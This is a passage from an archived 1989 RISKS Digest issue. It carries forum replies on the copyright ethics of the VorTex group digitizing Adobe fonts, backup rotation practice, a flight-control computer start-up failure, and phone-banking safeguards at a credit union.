to interpret the extent of (un)fair behaviour, whether commercial or
consumptive.  The non-competitive VorTex case seems quite within the range of
what is called "Fair Use" under Section 107 of the US Copyright Act.  In fact,
Mr Neff did not clarify his claim that the VorTex activity with respect to
Adobe was "certainly not research", as VorTex seemed concerned with saving
money for research purposes; rather, the VorTex group might deserve to be
congratulated with saving the Californian and other taxpayers' money?  After
all, the VorTex group did not slavishly copy a protected object for its own,
routine use, but analyzed it and then built its own version instead.  The
similarity to industrial 'clean room' procedures where (computer) architects
analyze an object and provide their findings to an independent, 'clean' team of
programmers or hardware engineers may be obvious.

As regards copyright protection of digital encoding of fonts, I doubt that this
does not exist in the USA.  Certainly, the 1988 Copyright, Designs and Patents
Act in the U.K. provides for specific Copyright protection of typefaces and
print lay-outs.  Much more serious is the possibility that the VorTex group (if
Fair Use under Section 107 USC Copyright Act should not apply) might invoke the
11th Amendment to the US Constitution which grants individual States (including
State instrumentalities like the University of California at Berkeley) immunity
against copyright damage claims under the federal Copyright Act:  see the paper
"An Open Letter on Piracy" in Software Magazine 8(3) of March 1988, republished
in ACM's Computers and Society 18(3) of July 1988, also referred to in my Risks
posting of March 2, 1989 quoted above.

Finally, I hope that Mr Neff has communicated his feelings to the UCB professor
of whom he was so critical, and that a reaction may appear from him on this
forum; I hope that such a communication took place prior to Mr Neff's going
public on this issue.

Herman J. Woltring &lt;na.woltring@patience.stanford.edu, wwtmhjw@heitue5.bitnet&gt;

Member, Study Committee on Software and Semiconductor Topography Protection,
Netherlands Association for Computers and Law

Disclaimer:  There is an interesting book (in Dutch, unfortunately)
  published in 1986 in The Hague/NL by the Netherlands Order of Patents
  Attorneys at the occasion of their Order's 50th Anniversary.

  It was written by F. Gerzon, and entitled "The Netherlands: are we a
  people of highwaymen?  The re-enactment of the Dutch Patents Act (1869-1912)".

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Re: Ethics Question (Randall Neff, <A HREF="/Risks/8.37.html">RISKS-8.37</A>)
</A>
</H3>
<address>
&lt;<A HREF="mailto:att!cuuxb!mmengel@ucbvax.Berkeley.EDU">
att!cuuxb!mmengel@ucbvax.Berkeley.EDU
</A>&gt;
</address>
<i>
Mon, 13 Mar 89 23:59:59 -0800
</i><PRE>

&gt;Is this ethically correct?   

	Copyrights and intellectual property are a very sticky issue...
	especially in a case like this. 

	Consider: Adobe's *internal coding* of the fonts is considered 
	a trade secret, and that trade secret has *not* been abridged 
	by digitising the display of the font.  The display of the
	font was performed by the group's equipment, and with electricity
	for which they paid... If I buy a machine that makes pretzels,
	may I not sell the pretzels?  

	Lets say I write a book, printed with Adobe's fonts -- can I
	sell copies of the book?  Or must I purhcase the font from Adobe
	for large sums of money?

&gt;Is it all right to acquire a company's product by clever coding?  

	Clearly not, if you mean breaking some form of computer security
	to obtain copies of the software, etc.  On the other hand, to 
	build your own product that acts like another company's is quite 
	the proper thing to do.  Just ask Suave shampoo. ("Ours does what 
	theirs does...") Or your local pharmacist who makes generic versions 
	of common brand name pharmaceuticals.

	It is the latter course that the CS department has followed, in
	my opinion.

&gt;Is it reasonable behavior for a Famous CS department funded by California 
&gt;     taxpayers and NSF grants (it is certainly not research)?

	I find your assertion questionable -- after all, universities
	design operating systems, and aren't there operating systems
	being sold by companies?  Don't features of those operating
	systems get put into these research systems by "clever coding?"

	If you want to, you can make any research implementation of 
	anything which has been previously built in industry sound like
	some sort of copyright violation; just say that the products
	do similar things, and the students managed to "reproduce" the
	package with "clever coding"...  Never mind if the researchers
	happen to stumble upon a signifiganly improved method of getting
	the job done, or learn something usefull about software engineering...

&gt;Is there a reasonable way for an audience member to stand up and say:
&gt;    "For Shame, this is ethically reprehensible behavior and you're setting
&gt;     a bad example for students everywhere."

	Not unless you can first demonstrate that the behaviour is
	morally reprehensible.  When you can do that, you need merely
	ask a few pointed questions of the presenters, and the conclusion
	will be obvious to the other listeners.

	However, from the way you describe it, they wrote their own
	implementation of Postscript, a programming language in its
	own right, with their own code for displaying fonts, etc.
	and then wrote a program that could digitize characters which
	were to be displayed on their printer, and could digitize *any*
	font displayed on that printer, even one they might have done
	by hand; they then used this tool to digitize a font they had
	purchased the right to reproduce in its displayed form (It would
	be ludicrous to suggest they need an incredibly expensive liscence
	just to make photocopies of documents printed on their printer,
	for example).

	They rewrote Postscript, and digitized some fonts for its use.
	They could just as easily have run the New York Times through
	a scanner and picked the letters from it, or typed the alphabet
	on their typewriter and scanned it in with a digitizer.
	The typewriter company sells those printwheels for the typewriter;
	but have our proponents done anything ethically abhorrent?  I
	don't think so.

 Marc Mengel

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Re: Toshiba DOS 3.3 Backup deletes files
</A>
</H3>
<address>
"Jay Elinsky" 
&lt;<A HREF="mailto:ELINSKY@YKTVMX.BITNET">
ELINSKY@YKTVMX.BITNET
</A>&gt;
</address>
<i>
Thu, 16 Mar 89 08:56:31 EST
</i><PRE>

Stephen Farrell writes

&gt;the moral seems to be that you should sometimes make a backup before making a
&gt;backup!

It's "standard practice" to keep at least two sets of backups.  Call one
set of diskettes A, and the other B.  This week write your backups on
set A.  Next week write them on set B, and then back to set A, etc.  If your
machine dies in the middle of writing on set B, you have some hope of
restoring from set A (the backup you took a week ago).

The UNIX manual page dump(8) tells about a hierarchial dumping scheme in which
you keep some backups forever.
                                 Jay Elinsky, IBM T.J. Watson Research Center,
                                 Yorktown Heights, NY

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Re: IBM's claims to omnipotence (<A HREF="/Risks/8.32.html">RISKS-8.32</A>)
</A>
</H3>
<address>
Dr Robert Frederking
&lt;<A HREF="mailto:ref@ztivax.siemens.com ">
ref@ztivax.siemens.com 
</A>&gt;
</address>
<i>
Mon, 13 Mar 89 14:49:16 -0100
</i><PRE>

(1) Why these things always go IBM's way in the press:
    IBM probably has more PR people than most companies have programmers.

(2) My biggest complaint about an article like this is that apparently no
    one, including the reporter and the poster to this list, remembers that
    the first(?) launch had to be rescheduled because of a complete computer
    system failure in the flight-control computers!  This, in a "bug-free"
    system.  It turned out that there was a 1-in-64 chance (really!) of the
    system not synchronizing on start-up.  Once it hit the bad combination,
    it had to be reset before it would correctly synchronize.  This wasn't
    discovered in testing because they were too busy testing software in the
    individual machines to keep cold-starting the whole system.  The whole
    thing had been started from scratch less than 10 times.

Robert Frederking, Siemens AG/ZFE F2 INF 23, Otto-Hahn-Ring 6,
D-8000 Munich 83  West Germany	Phone: (-89) 636 47129

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
 Re:  Pushbutton Banking
</A>
</H3>
<address>
    Tom Coradeschi 
&lt;<A HREF="mailto:tcora@ARDEC.ARPA">
tcora@ARDEC.ARPA
</A>&gt;
</address>
<i>
Thu, 16 Mar 89 18:27:21 EST
</i><PRE>

In a similar vein, the credit union here, at ARDEC has a system much like that
you've described. It is somewhat safer, however. The ID number you use is your
choice, not something nominally available to the public, like your SSN. It is
not possible to transfer funds OUT of checking, to savings or elsewhere. It is
possible to transfer funds into checking, but that's what you want to do,
anyway. The only possible means of screwing someone over, I can think of, would
be to locate both his account number and ID number, and make a withdrawal.
However, the method of withdrawal the credit union uses is to mail a check to
the address of record for the account. And there is no way to change your
address using the phone. That requires an in-person visit, with account
identification. If you've got that, why bother using the phone, when you can
walk up to a teller window and clean out the account?  I'm sure that there are
some bugs in this system as implemented, and someone who was really trying
could find them, but they certainly aren't as readily apparent as those
described earlier.
                                        tom c

Electromagnetic Armament Technology Branch, US Army Armament Research,
Development and Engineering Center, Picatinny Arsenal, NJ 07806-5000

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/8.38.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.40.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
